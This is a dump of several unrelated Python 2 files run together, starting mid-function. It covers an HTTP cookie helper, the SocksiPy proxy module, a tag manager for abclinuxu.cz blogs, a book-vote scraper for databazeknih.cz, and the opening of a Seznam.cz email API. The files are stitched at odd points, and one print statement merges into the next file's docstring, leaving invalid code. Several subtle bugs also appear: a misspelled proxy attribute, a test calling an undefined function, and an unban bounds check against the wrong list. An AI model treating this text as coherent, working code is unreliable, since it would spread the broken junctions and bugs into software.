			headers["Cookie"] = cookie_string.strip()

	# download page    
	f = urllib2.urlopen(urllib2.Request(url, post, headers))
	data = f.read()

	# simple cookies handling
	if hcookies or handle_cookies:
		cs = f.info().items()   # get header from server
		
		# parse "set-cookie" string
		cookie_string = ""
		for c in cs:
			if c[0].lower() == "set-cookie":
				cookie_string = c[1]
					
		# parse keyword:values
		tmp_cookies = {}
		for c in cookie_string.split(","):
			cookie = c
			if ";" in c:
				cookie = c.split(";")[0]
			cookie = cookie.strip()
			
			cookie = cookie.split("=")
			keyword = cookie[0]
			value = "=".join(cookie[1:])
			
			tmp_cookies[keyword] = value
		
		# append global variable cookis with new cookies
		if len(tmp_cookies) > 0:
			domain = getDomain(url)
			
			if domain in cookies.keys():
				for key in tmp_cookies.keys():
					cookies[domain][key] = tmp_cookies[key] 
			else:
				cookies[domain] = tmp_cookies
			  
		# check for blank cookies
		if len(cookies) > 0:
			for domain in cookies.keys():
				for key in cookies[domain].keys():
					if cookies[domain][key].strip() == "":
						del cookies[domain][key]
				
				if len(cookies[domain]) == 0:
					del cookies[domain]                
	
	f.close()

	return data


def removeTags(txt):
	"""
	Remove tags from text. Every text field between < and > will be deleted.

	@param txt: Text which will be cleared.
	@type  txt: string

	@return: Cleared text.
	@rtype:  string
	"""
	for i in re.findall(r"""<(?:"[^"]*"['"]*|'[^']*'['"]*|[^'">])+>""", txt):
		txt = txt.replace(i, "")
		
	return txt.strip()


def getVisibleText(txt):
	"""
	Removes tags and text between <title>, <script> and <style> tags.

	@param txt: Text which will be cleared.
	@type  txt: string

	@return: Cleared text.
	@rtype:  string
	"""
	for i in re.findall(r"""<script.*?>[\s\S]*?</.*?script>""", txt):
		txt = txt.replace(i, "")

	for i in re.findall(r"""<style.*?>[\s\S]*?</.*?style>""", txt):
		txt = txt.replace(i, "")

	for i in re.findall(r"""<title.*?>[\s\S]*?</.*?title>""", txt):
		txt = txt.replace(i, "")

	return removeTags(txt)



#===============================================================================
#= Main program ================================================================
#===============================================================================
if __name__ == "__main__":
	print "CheckerTools v" + __version + " (10.09.2011) by Bystroushaak (bystrousak@kitakitsune.org)""""SocksiPy - Python SOCKS module.
Version 1.00

Copyright 2006 Dan-Haim. All rights reserved.

Redistribution and use in source and binary forms, with or without modification,
are permitted provided that the following conditions are met:
1. Redistributions of source code must retain the above copyright notice, this
   list of conditions and the following disclaimer.
2. Redistributions in binary form must reproduce the above copyright notice,
   this list of conditions and the following disclaimer in the documentation
   and/or other materials provided with the distribution.
3. Neither the name of Dan Haim nor the names of his contributors may be used
   to endorse or promote products derived from this software without specific
   prior written permission.
   
THIS SOFTWARE IS PROVIDED BY DAN HAIM "AS IS" AND ANY EXPRESS OR IMPLIED
WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF
MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO
EVENT SHALL DAN HAIM OR HIS CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT,
INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT
LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA
OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF
LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT
OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMANGE.


This module provides a standard socket-like interface for Python
for tunneling connections through SOCKS proxies.

"""

import socket
import struct

PROXY_TYPE_SOCKS4 = 1
PROXY_TYPE_SOCKS5 = 2
PROXY_TYPE_HTTP = 3

_defaultproxy = None
_orgsocket = socket.socket

class ProxyError(Exception):
	def __init__(self, value):
		self.value = value
	def __str__(self):
		return repr(self.value)

class GeneralProxyError(ProxyError):
	def __init__(self, value):
		self.value = value
	def __str__(self):
		return repr(self.value)

class Socks5AuthError(ProxyError):
	def __init__(self, value):
		self.value = value
	def __str__(self):
		return repr(self.value)

class Socks5Error(ProxyError):
	def __init__(self, value):
		self.value = value
	def __str__(self):
		return repr(self.value)

class Socks4Error(ProxyError):
	def __init__(self, value):
		self.value = value
	def __str__(self):
		return repr(self.value)

class HTTPError(ProxyError):
	def __init__(self, value):
		self.value = value
	def __str__(self):
		return repr(self.value)

_generalerrors = ("success",
		   "invalid data",
		   "not connected",
		   "not available",
		   "bad proxy type",
		   "bad input")

_socks5errors = ("succeeded",
		  "general SOCKS server failure",
		  "connection not allowed by ruleset",
		  "Network unreachable",
		  "Host unreachable",
		  "Connection refused",
		  "TTL expired",
		  "Command not supported",
		  "Address type not supported",
		  "Unknown error")

_socks5autherrors = ("succeeded",
		      "authentication is required",
		      "all offered authentication methods were rejected",
		      "unknown username or invalid password",
		      "unknown error")

_socks4errors = ("request granted",
		  "request rejected or failed",
		  "request rejected because SOCKS server cannot connect to identd on the client",
		  "request rejected because the client program and identd report different user-ids",
		  "unknown error")

def setdefaultproxy(proxytype=None,addr=None,port=None,rdns=True,username=None,password=None):
	"""setdefaultproxy(proxytype, addr[, port[, rdns[, username[, password]]]])
	Sets a default proxy which all further socksocket objects will use,
	unless explicitly changed.
	"""
	global _defaultproxy
	_defaultproxy = (proxytype,addr,port,rdns,username,password)
	
class socksocket(socket.socket):
	"""socksocket([family[, type[, proto]]]) -> socket object
	
	Open a SOCKS enabled socket. The parameters are the same as
	those of the standard socket init. In order for SOCKS to work,
	you must specify family=AF_INET, type=SOCK_STREAM and proto=0.
	"""
	
	def __init__(self, family=socket.AF_INET, type=socket.SOCK_STREAM, proto=0, _sock=None):
		_orgsocket.__init__(self,family,type,proto,_sock)
		if _defaultproxy != None:
			self.__proxy = _defaultproxy
		else:
			self.__proxy = (None, None, None, None, None, None)
		self.__proxysockname = None
		self.__proxypeername = None
	
	def __recvall(self, bytes):
		"""__recvall(bytes) -> data
		Receive EXACTLY the number of bytes requested from the socket.
		Blocks until the required number of bytes have been received.
		"""
		data = ""
		while len(data) < bytes:
			data = data + self.recv(bytes-len(data))
		return data
	
	def setproxy(self,proxytype=None,addr=None,port=None,rdns=True,username=None,password=None):
		"""setproxy(proxytype, addr[, port[, rdns[, username[, password]]]])
		Sets the proxy to be used.
		proxytype -	The type of the proxy to be used. Three types
				are supported: PROXY_TYPE_SOCKS4 (including socks4a),
				PROXY_TYPE_SOCKS5 and PROXY_TYPE_HTTP
		addr -		The address of the server (IP or DNS).
		port -		The port of the server. Defaults to 1080 for SOCKS
				servers and 8080 for HTTP proxy servers.
		rdns -		Should DNS queries be preformed on the remote side
				(rather than the local side). The default is True.
				Note: This has no effect with SOCKS4 servers.
		username -	Username to authenticate with to the server.
				The default is no authentication.
		password -	Password to authenticate with to the server.
				Only relevant when username is also provided.
		"""
		self.__proxy = (proxytype,addr,port,rdns,username,password)
	
	def __negotiatesocks5(self,destaddr,destport):
		"""__negotiatesocks5(self,destaddr,destport)
		Negotiates a connection through a SOCKS5 server.
		"""
		# First we'll send the authentication packages we support.
		if (self.__proxy[4]!=None) and (self.__proxy[5]!=None):
			# The username/password details were supplied to the
			# setproxy method so we support the USERNAME/PASSWORD
			# authentication (in addition to the standard none).
			self.sendall("\x05\x02\x00\x02")
		else:
			# No username/password were entered, therefore we
			# only support connections with no authentication.
			self.sendall("\x05\x01\x00")
		# We'll receive the server's response to determine which
		# method was selected
		chosenauth = self.__recvall(2)
		if chosenauth[0] != "\x05":
			self.close()
			raise GeneralProxyError((1,_generalerrors[1]))
		# Check the chosen authentication method
		if chosenauth[1] == "\x00":
			# No authentication is required
			pass
		elif chosenauth[1] == "\x02":
			# Okay, we need to perform a basic username/password
			# authentication.
			self.sendall("\x01" + chr(len(self.__proxy[4])) + self.__proxy[4] + chr(len(self.proxy[5])) + self.__proxy[5])
			authstat = self.__recvall(2)
			if authstat[0] != "\x01":
				# Bad response
				self.close()
				raise GeneralProxyError((1,_generalerrors[1]))
			if authstat[1] != "\x00":
				# Authentication failed
				self.close()
				raise Socks5AuthError,((3,_socks5autherrors[3]))
			# Authentication succeeded
		else:
			# Reaching here is always bad
			self.close()
			if chosenauth[1] == "\xFF":
				raise Socks5AuthError((2,_socks5autherrors[2]))
			else:
				raise GeneralProxyError((1,_generalerrors[1]))
		# Now we can request the actual connection
		req = "\x05\x01\x00"
		# If the given destination address is an IP address, we'll
		# use the IPv4 address request even if remote resolving was specified.
		try:
			ipaddr = socket.inet_aton(destaddr)
			req = req + "\x01" + ipaddr
		except socket.error:
			# Well it's not an IP number,  so it's probably a DNS name.
			if self.__proxy[3]==True:
				# Resolve remotely
				ipaddr = None
				req = req + "\x03" + chr(len(destaddr)) + destaddr
			else:
				# Resolve locally
				ipaddr = socket.inet_aton(socket.gethostbyname(destaddr))
				req = req + "\x01" + ipaddr
		req = req + struct.pack(">H",destport)
		self.sendall(req)
		# Get the response
		resp = self.__recvall(4)
		if resp[0] != "\x05":
			self.close()
			raise GeneralProxyError((1,_generalerrors[1]))
		elif resp[1] != "\x00":
			# Connection failed
			self.close()
			if ord(resp[1])<=8:
				raise Socks5Error(ord(resp[1]),_generalerrors[ord(resp[1])])
			else:
				raise Socks5Error(9,_generalerrors[9])
		# Get the bound address/port
		elif resp[3] == "\x01":
			boundaddr = self.__recvall(4)
		elif resp[3] == "\x03":
			resp = resp + self.recv(1)
			boundaddr = self.__recvall(resp[4])
		else:
			self.close()
			raise GeneralProxyError((1,_generalerrors[1]))
		boundport = struct.unpack(">H",self.__recvall(2))[0]
		self.__proxysockname = (boundaddr,boundport)
		if ipaddr != None:
			self.__proxypeername = (socket.inet_ntoa(ipaddr),destport)
		else:
			self.__proxypeername = (destaddr,destport)
	
	def getproxysockname(self):
		"""getsockname() -> address info
		Returns the bound IP address and port number at the proxy.
		"""
		return self.__proxysockname
	
	def getproxypeername(self):
		"""getproxypeername() -> address info
		Returns the IP and port number of the proxy.
		"""
		return _orgsocket.getpeername(self)
	
	def getpeername(self):
		"""getpeername() -> address info
		Returns the IP address and port number of the destination
		machine (note: getproxypeername returns the proxy)
		"""
		return self.__proxypeername
	
	def __negotiatesocks4(self,destaddr,destport):
		"""__negotiatesocks4(self,destaddr,destport)
		Negotiates a connection through a SOCKS4 server.
		"""
		# Check if the destination address provided is an IP address
		rmtrslv = False
		try:
			ipaddr = socket.inet_aton(destaddr)
		except socket.error:
			# It's a DNS name. Check where it should be resolved.
			if self.__proxy[3]==True:
				ipaddr = "\x00\x00\x00\x01"
				rmtrslv = True
			else:
				ipaddr = socket.inet_aton(socket.gethostbyname(destaddr))
		# Construct the request packet
		req = "\x04\x01" + struct.pack(">H",destport) + ipaddr
		# The username parameter is considered userid for SOCKS4
		if self.__proxy[4] != None:
			req = req + self.__proxy[4]
		req = req + "\x00"
		# DNS name if remote resolving is required
		# NOTE: This is actually an extension to the SOCKS4 protocol
		# called SOCKS4A and may not be supported in all cases.
		if rmtrslv==True:
			req = req + destaddr + "\x00"
		self.sendall(req)
		# Get the response from the server
		resp = self.__recvall(8)
		if resp[0] != "\x00":
			# Bad data
			self.close()
			raise GeneralProxyError((1,_generalerrors[1]))
		if resp[1] != "\x5A":
			# Server returned an error
			self.close()
			if ord(resp[1]) in (91,92,93):
				self.close()
				raise Socks4Error((ord(resp[1]),_socks4errors[ord(resp[1])-90]))
			else:
				raise Socks4Error((94,_socks4errors[4]))
		# Get the bound address/port
		self.__proxysockname = (socket.inet_ntoa(resp[4:]),struct.unpack(">H",resp[2:4])[0])
		if rmtrslv != None:
			self.__proxypeername = (socket.inet_ntoa(ipaddr),destport)
		else:
			self.__proxypeername = (destaddr,destport)
	
	def __negotiatehttp(self,destaddr,destport):
		"""__negotiatehttp(self,destaddr,destport)
		Negotiates a connection through an HTTP server.
		"""
		# If we need to resolve locally, we do this now
		if self.__proxy[3] == False:
			addr = socket.gethostbyname(destaddr)
		else:
			addr = destaddr
		self.sendall("CONNECT " + addr + ":" + str(destport) + " HTTP/1.1\r\n" + "Host: " + destaddr + "\r\n\r\n")
		# We read the response until we get the string "\r\n\r\n"
		resp = self.recv(1)
		while resp.find("\r\n\r\n")==-1:
			resp = resp + self.recv(1)
		# We just need the first line to check if the connection
		# was successful
		statusline = resp.splitlines()[0].split(" ",2)
		if statusline[0] not in ("HTTP/1.0","HTTP/1.1"):
			self.close()
			raise GeneralProxyError((1,_generalerrors[1]))
		try:
			statuscode = int(statusline[1])
		except ValueError:
			self.close()
			raise GeneralProxyError((1,_generalerrors[1]))
		if statuscode != 200:
			self.close()
			raise HTTPError((statuscode,statusline[2]))
		self.__proxysockname = ("0.0.0.0",0)
		self.__proxypeername = (addr,destport)
	
	def connect(self,destpair):
		"""connect(self,despair)
		Connects to the specified destination through a proxy.
		destpar - A tuple of the IP/DNS address and the port number.
		(identical to socket's connect).
		To select the proxy server use setproxy().
		"""
		# Do a minimal input check first
		if (type(destpair) in (list,tuple)==False) or (len(destpair)<2) or (type(destpair[0])!=str) or (type(destpair[1])!=int):
			raise GeneralProxyError((5,_generalerrors[5]))
		if self.__proxy[0] == PROXY_TYPE_SOCKS5:
			if self.__proxy[2] != None:
				portnum = self.__proxy[2]
			else:
				portnum = 1080
			_orgsocket.connect(self,(self.__proxy[1],portnum))
			self.__negotiatesocks5(destpair[0],destpair[1])
		elif self.__proxy[0] == PROXY_TYPE_SOCKS4:
			if self.__proxy[2] != None:
				portnum = self.__proxy[2]
			else:
				portnum = 1080
			_orgsocket.connect(self,(self.__proxy[1],portnum))
			self.__negotiatesocks4(destpair[0],destpair[1])
		elif self.__proxy[0] == PROXY_TYPE_HTTP:
			if self.__proxy[2] != None:
				portnum = self.__proxy[2]
			else:
				portnum = 8080
			_orgsocket.connect(self,(self.__proxy[1],portnum))
			self.__negotiatehttp(destpair[0],destpair[1])
		elif self.__proxy[0] == None:
			_orgsocket.connect(self,(destpair[0],destpair[1]))
		else:
			raise GeneralProxyError((4,_generalerrors[4]))
#! /usr/bin/env python2
# -*- coding: utf-8 -*-
#
# Interpreter version: python 2.7
#
import sys
# -*- coding: utf-8 -*-
from abclinuxuapi import Tag


SIGN_TAGS = []#Tag("ProtectedByTagManager", "ProtectedByTagManager")]


def protect_tags(conf, blog, remove=True):
    allowed_tags = conf.allowed_tags.get(blog.uid, []) + SIGN_TAGS
    unmanaged_tags = conf.unmanaged_tags.get(blog.uid, [])

    assigned_tags = blog.tags
    for tag in assigned_tags:
        if tag in allowed_tags:
            continue

        if tag not in conf.banlist:
            unmanaged_tags.append(tag)

        if remove:
            blog.remove_tag(tag)

    for tag in allowed_tags + SIGN_TAGS:
        if tag not in assigned_tags:
            blog.add_tag(tag)

    conf.allowed_tags[blog.uid] = list(set(allowed_tags))
    conf.unmanaged_tags[blog.uid] = list(set(unmanaged_tags))

    if unmanaged_tags:
        conf.save()
#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Interpreter version: python 2.7
#
import sys
import argparse

import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

from abclinuxuapi import Tag
from abclinuxuapi import Blogpost

from tag_protector import protect_tags
from configuration import Configuration


PROMPT = "\n:> "


def normalize_url(url):
    if not (url.startswith("http://") or url.startswith("https://")):
        url = "http://" + url

    return url


def uniq(array):
    return list(set(array))


def remove_from_dict(groups, item):
    for tag_list in groups.values():
        if item in tag_list:
            del tag_list[tag_list.index(item)]


def _print_list(enumeration, spaces=True):
    if spaces:
        print

    for cnt, blog_url in enumerate(enumeration):
        print ("\t%d)" % cnt), blog_url

    if spaces:
        print


def _parse_command(choice):
    # validations of commands
    if " " not in choice:
        if choice.isdigit():
            return "", int(choice)

        raise ValueError("Error: invalid command!")

    command, choice = choice.split(" ", 1)

    choice = choice.strip()
    command = command.strip()

    if not choice.isdigit():
        raise ValueError("Error: invalid choice number!")

    choice = int(choice)

    return command, choice


class UserInterface(object):
    def __init__(self, conf):
        self._conf = conf

    def protect_blog(self, url):
        url = normalize_url(url)

        uid = self._conf.url_to_uid.get(url)

        # parsing speedup
        blog = Blogpost(url, uid=uid)
        if not uid:
            blog.pull()
            self._conf.url_to_uid[url] = blog.uid
            self._conf.save()

        protect_tags(self._conf, blog)

    def protect_blogs(self):
        for blog in self._conf.blogs:
            self.protect_blog(blog)

    def manage_blog(self, url):
        url = normalize_url(url)

        print "Managing", url
        print "(please wait for download..)"
        print

        blog = Blogpost(url)
        blog.pull()
        protect_tags(self._conf, blog, remove=False)

        allowed_tags = self._conf.allowed_tags[blog.uid]
        unmanaged_tags = self._conf.unmanaged_tags[blog.uid]

        while True:
            print "Banned tags (commands: [b]an n / [u]nban n):"

            _print_list(self._conf.banlist)

            print "Allowed tags (commands: n / a[l]low n / [d]isallow n):"

            _print_list(allowed_tags)

            print "Un-managed tags:"

            _print_list(unmanaged_tags)

            print "Use `[a]pply` to apply. Press CTRL+d to exit."

            # read user's choice
            try:
                choice = raw_input(PROMPT).strip()
            except EOFError:
                self._conf.save()
                return

            if choice in ["a", "apply"]:
                self._conf.save()

                self._conf.allowed_tags[blog.uid] = allowed_tags
                self._conf.unmanaged_tags[blog.uid] = unmanaged_tags

                for tag in allowed_tags:
                    # this is True only for newly added tags
                    if isinstance(tag, Tag):
                        blog.add_tag(tag)

                protect_tags(self._conf, blog, remove=True)

                continue

            try:
                command, choice = _parse_command(choice)
                command = command.lower()
            except ValueError as e:
                print e.message
                continue

            if command in ["", "l", "allow"]:
                if choice >= len(unmanaged_tags) or choice < 0:
                    print "Error: invalid id of UN-MANAGED tag."
                    continue

                allowed_tags.append(unmanaged_tags[choice])
                unmanaged_tags.remove(unmanaged_tags[choice])

            elif command in ["d", "disallow"]:
                if choice >= len(allowed_tags) or choice < 0:
                    print "Error: invalid id of ALLOWED tag."
                    continue

                unmanaged_tags.append(allowed_tags[choice])
                allowed_tags.remove(allowed_tags[choice])

            elif command in ["b", "ban"]:
                if choice >= len(unmanaged_tags) or choice < 0:
                    print "Error: invalid id of UN-MANAGED tag."
                    continue

                self._conf.banlist.append(unmanaged_tags[choice])
                self._conf.banlist = uniq(self._conf.banlist)

                unmanaged_tags.remove(unmanaged_tags[choice])

                # remove from other blogs
                for banned in self._conf.banlist:
                    remove_from_dict(self._conf.allowed_tags, banned)
                    remove_from_dict(self._conf.unmanaged_tags, banned)

            elif command in ["u", "unban"]:
                if choice >= len(unmanaged_tags) or choice < 0:
                    print "Error: invalid id of BANNED tag."
                    continue

                unmanaged_tags.append(self._conf.banlist[choice])
                self._conf.banlist.remove(self._conf.banlist[choice])

            else:
                print "Err: Unknown command `%s`." % command
                continue

    def manage(self):
        while True:
            if self._conf.blogs:
                print "Choose any of the listed blogs."
                print
                _print_list(self._conf.blogs)
                print

            print "Type blog's URL to add new (you don't have to type http://)."
            print "Try `rm` command to remove the blog."
            print "Use CTRL+d to exit."

            # read user's choice
            try:
                choice = raw_input(PROMPT)
            except EOFError:
                self._conf.save()
                return

            # process the choice
            choice = choice.strip()
            if choice.isdigit():
                choice = int(choice)

                if choice >= len(self._conf.blogs) or choice < 0:
                    print "Err: Invalid choice."
                    continue

                self.manage_blog(self._conf.blogs[choice])
                continue

            elif choice.startswith("rm "):
                choice = choice.split(" ", 1)[-1].strip()

                if not choice.isdigit():
                    print "Err: Invalid choice number."
                    continue

                self._conf.blogs.remove(self._conf.blogs[int(choice)])
                continue

            elif choice.strip():
                self._conf.blogs.append(choice.strip())

            else:
                print "Err: Invalid choice."


if __name__ == '__main__':
    parser = argparse.ArgumentParser(
        description="""
            This program is used to watch over tags assigned to your
            http://abclinuxu.cz blogs.
        """
    )
    parser.add_argument(
        "-m",
        "--manage",
        action="store_true",
        help="Manage blogs."
    )

    args = parser.parse_args()

    ui = UserInterface(Configuration("tag_manager_data.shelve"))

    if args.manage:
        ui.manage()
        sys.exit(0)

    ui.protect_blogs()
#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Interpreter version: python 2.7
#
# Imports =====================================================================
# -*- coding: utf-8 -*-
import shelve
import os.path


class Configuration(object):
    def __init__(self, fn, lazy=False):
        self.blogs = []

        # url -> uid to speed up tag lookup
        self.url_to_uid = {}

        # uid -> [tags, ..] mapping
        self.allowed_tags = {}
        self.unmanaged_tags = {}

        self.banlist = []

        self.fn = fn

        if not lazy:
            self.load()

    def from_dict(self, d):
        self.__dict__.update(d)

    def to_dict(self):
        return self.__dict__.copy()

    def save(self, fn=None):
        fn = fn or self.fn

        db = shelve.open(fn)
        db["data"] = self.to_dict()
        db.close()

    def load(self, fn=None):
        fn = fn or self.fn

        if not os.path.exists(fn):
            return

        db = shelve.open(fn)
        self.from_dict(db.get("data", {}))
        db.close()
#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Interpreter version: python 2.7
#
# Imports =====================================================================
import sys
import time
import argparse
from multiprocessing import Process

import zmq

from databazeknih_api import get_book_info, Vote, User, Book, MAX_ID


# Variables ===================================================================
DEFAULT_WORKERS = 10
VENTILATOR_PORT = 5007
CONTROL_PORT = 5008
DB_PORT = 5009


# Functions & objects =========================================================
def worker(wrk_num):
    context = zmq.Context()

    results_sender = context.socket(zmq.PUSH)
    results_sender.connect("tcp://127.0.0.1:%d" % DB_PORT)

    work_receiver = context.socket(zmq.PULL)
    work_receiver.connect("tcp://127.0.0.1:%d" % VENTILATOR_PORT)

    control_receiver = context.socket(zmq.SUB)
    control_receiver.connect("tcp://127.0.0.1:%d" % CONTROL_PORT)
    control_receiver.setsockopt(zmq.SUBSCRIBE, "")

    poller = zmq.Poller()
    poller.register(work_receiver, zmq.POLLIN)
    poller.register(control_receiver, zmq.POLLIN)

    while True:
        socks = dict(poller.poll())

        if socks.get(work_receiver) == zmq.POLLIN:
            book_id = work_receiver.recv_json()
            book_info = get_book_info(book_id)

            results_sender.send_json(
                book_info.to_json()
            )

        # react to control message
        if socks.get(control_receiver) == zmq.POLLIN:
            if control_receiver.recv() == "FINISHED":
                print "Worker " + str(wrk_num) + " received FINSHED, quitting!"
                return


def db_worker():
    context = zmq.Context()

    work_receiver = context.socket(zmq.PULL)
    work_receiver.bind("tcp://127.0.0.1:%d" % DB_PORT)

    control_receiver = context.socket(zmq.SUB)
    control_receiver.connect("tcp://127.0.0.1:%d" % CONTROL_PORT)
    control_receiver.setsockopt(zmq.SUBSCRIBE, "")

    poller = zmq.Poller()
    poller.register(work_receiver, zmq.POLLIN)
    poller.register(control_receiver, zmq.POLLIN)

    while True:
        socks = dict(poller.poll())

        if socks.get(work_receiver) == zmq.POLLIN:
            work_message = work_receiver.recv_json()
            print "Received work" + str(work_message["id"])
            #TODO: save to shelve

        # react to control message
        if socks.get(control_receiver) == zmq.POLLIN:
            if control_receiver.recv() == "FINISHED":
                print "DB worker is quitting!"
                return

def ventilator():
    context = zmq.Context()

    ventilator_send = context.socket(zmq.PUSH)
    ventilator_send.bind("tcp://127.0.0.1:%d" % VENTILATOR_PORT)

    control_sender = context.socket(zmq.PUB)
    control_sender.bind("tcp://127.0.0.1:%d" % CONTROL_PORT)

    time.sleep(1)
    for book_id in range(args.to - args.from_ + 1):
        book_id = args.from_ + book_id
        print "book_id", book_id
        ventilator_send.send_json(book_id)

    time.sleep(1)

    control_sender.send("FINISHED")
    time.sleep(5)


def main(args):
    # Create a pool of workers to distribute work to
    for wrk_num in range(args.workers):
        Process(target=worker, args=(wrk_num,)).start()

    Process(target=db_worker, args=()).start()
    ventilator()
    print "quitting"
    sys.exit(0)


# Main program ================================================================
if __name__ == '__main__':
    parser = argparse.ArgumentParser(
        description="""This script is used to download voting informations from
                       databazeknih.cz."""
    )
    parser.add_argument(
        "-f",
        "--from",
        default=1,
        dest="from_",
        type=int,
        help="""From which BookID should script start to harvest voting
                informations. Default 1."""
    )
    parser.add_argument(
        "-t",
        "--to",
        type=int,
        default=MAX_ID,
        help="""At which BookID should script stop to harvest voting
                informations."""
    )
    parser.add_argument(
        "-w",
        "--workers",
        type=int,
        default=DEFAULT_WORKERS,
        help="Use paralel workers. By default, use %d workers." % (
            DEFAULT_WORKERS,
        )
    )
    parser.add_argument(
        "-r",
        "--redownload",
        action="store_true",
        help="""By default, the script skips books, which were already
                downloaded. Use this parameter to download them again."""
    )

    args = parser.parse_args()

    if args.to and args.to < args.from_:
        sys.stderr.write("--to parameter can't be smaller than --from!\n")
        sys.exit(1)

    main(args)
#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Interpreter version: python 2.7
#
# Imports =====================================================================
import json
import time

import httpkie
import dhtmlparser


# Variables ===================================================================
DOWNER = httpkie.Downloader()

BASE_URL = "http://www.databazeknih.cz/"
VOTE_URL = "http://www.databazeknih.cz/hodnoceni-knihy/-%d"
MAX_ID = 500000


# Classes =====================================================================
class Vote(object):
    def __init__(self, user, vote):
        self.user = user
        self.vote = vote
        self.book_ref = None

    def to_json(self):
        return {
            "user": self.user.to_json(),
            "vote": self.vote
        }


class User(object):
    def __init__(self, nick, url):
        self.nick = nick
        self.url = url
        self.id = self._get_uid(url)

    def _get_uid(self, url):
        uid = url.split("-")[-1]

        return int(uid)

    def to_json(self):
        return self.__dict__


class Book(object):
    def __init__(self, bid, name, url):
        self.name = name
        self.url = url
        self.id = bid
        self.votes = []
        self.timestamp = time.time()

    def add_vote(self, vote):
        vote.book_ref = self
        self.votes.append(vote)

    def to_json(self):
        return {
            "name": self.name,
            "url": self.url,
            "id": self.id,
            "timestamp": self.timestamp,
            "votes": map(lambda x: x.to_json(), self.votes)
        }


# Functions ===================================================================
def _stars_to_vote(image_url):
    """
    Convert url of the "star" image to actual number of the stars.

    Args:
        image_url (str): ``http://img.databazeknih.cz/img/points/0p.png`` for
                         example.

    Returns:
        int: Number of stars in image. 0 for "odpad".
    """
    # http://img.databazeknih.cz/img/points/0p.png -> 0p.png
    image = image_url.split("/")[-1]

    # 0p.png -> 0
    vote = image.split("p")[0]

    return int(vote)


def get_book_info(book_id):
    """
    Parse votes for book with given `book_id`.

    Args:
        book_id (int): ID of the book.

    Returns:
        obj: :class:`Book` instance with all votes in :attr:`Book.votes` \
             property.
    """
    book_url = VOTE_URL % book_id
    data = DOWNER.download(book_url)
    dom = dhtmlparser.parseString(data)

    # parse book's name
    book_name = dom.find("h1")

    if book_name:
        book_name = book_name[0].getContent().strip()
        book_name = dhtmlparser.removeTags(book_name)
    else:
        book_name = dom.find("title")[0].getContent()

        if "|" in book_name:
            book_name = book_name.split("|")[0].strip()

    book = Book(book_id, book_name, book_url)

    # parse all votes for this book
    for div in dom.find("div", {"class": "ubox"}):
        # parse user info
        userinfo = div.find("a", {"title": 'Zobrazit profil uživatele'})[0]

        user_name = userinfo.getContent().strip()
        user_url = BASE_URL + userinfo.params["href"]

        user = User(user_name, user_url)

        # parse vote info
        voteinfo = div.find("img", {"class": 'nos'})[0]
        vote = Vote(
            user,
            _stars_to_vote(voteinfo.params["src"])
        )

        book.add_vote(vote)

    return book


# Tests =======================================================================
def test_stars_to_vote():
    assert _stars_to_vote("http://img.databazeknih.cz/img/points/0p.png") == 0
    assert _stars_to_vote("http://img.databazeknih.cz/img/points/1p.png") == 1
    assert _stars_to_vote("http://img.databazeknih.cz/img/points/2p.png") == 2
    assert _stars_to_vote("http://img.databazeknih.cz/img/points/3p.png") == 3
    assert _stars_to_vote("http://img.databazeknih.cz/img/points/4p.png") == 4
    assert _stars_to_vote("http://img.databazeknih.cz/img/points/5p.png") == 5


def test_get_votes():
    book = get_votes(100000)

    assert len(book.votes) >= 239
    assert book.votes[0].vote == 5
    assert book.votes[-1].vote == 0

    assert book.votes[0].book_ref == book

    assert book.name == "Zlatý kompas / His Dark Materials - Northern Lights"
#!/usr/bin/env python
# -*- coding: utf-8 -*-
#
# Interpreter version: python 2.7
#
#= Imports ====================================================================
"""
Seznam.cz email API by Bystroushaak
Version: 16.02.2014
"""
import sys
import time
from string import Template


try:
	import dhtmlparser as d
except ImportError:
	sys.stderr.write("This script requires DHTMLParser python module.\n")
	sys.stderr.write("You can download it from https://github.com/Bystroushaak/pyDHTMLParser\n")
	sys.exit(1)

try:
	from httpkie import Downloader
except ImportError:
	sys.stderr.write("You will need httpkie installed!")
	sys.exit(1)



#= Variables ===================================================================
downer      = Downloader()
LOGIN_URL   = "https://login.szn.cz/loginProcess"
MAIL_URL    = "http://email.seznam.cz/folderScreen?sessionId=&welcome=1&js=0"
MAIL_DOMAIN = "http://email.seznam.cz"
HEADERS_URL = "https://www.email.cz/download/H/"
FILE_URL    = "https://www.email.cz/download/i/"
RPC_URL     = "https://email.seznam.cz/RPC2"
ALLOWED_DOMAINS = [
	"seznam.cz",
	"email.cz",
	"post.cz",
	"spoluzaci.cz",
	"stream.cz",
	"firmy.cz"
]



#= Functions & objects ========================================================
class InterfaceException(Exception):
	"General exception for this project."
	def __init__(self, value):
		self.value = value

	def __str__(self):
		return repr(self.value)


class InvalidDomainException(InterfaceException):
	"Throwed when user use ivalid domain in mail address."

	def __init__(self, value):
		self.value = value

	def __str__(self):
		return repr(self.value)


class BadLoginException(InterfaceException):
	"Throwed when user try login with bad password or username."
	def __init__(self, value):
		self.value = value

	def __str__(self):
		return repr(self.value)


# credit http://stackoverflow.com/a/1094933
def sizeofFmt(num):
	for x in ['B', 'KB', 'MB', 'GB']:
		if num < 1024.0:
			return "%3.1f%s" % (num, x)
		num /= 1024.0
	return "%3.1f%s" % (num, 'TB')


def _XMLRPC2dict(xml):
	"""
	Convert XML-RPC response to python dictionary with matching types.
	http://cs.wikipedia.org/wiki/XML-RPC
	"""

	def getNonblank(arr):
		return filter(lambda x: len(str(x).strip()) > 0, arr)

	def processValue(value):
		"""
		Return appropriate value for given tag. std for
		<value><string>..</string></value> and so on.
		"""

		if not value.isTag():
			return value.getContent()

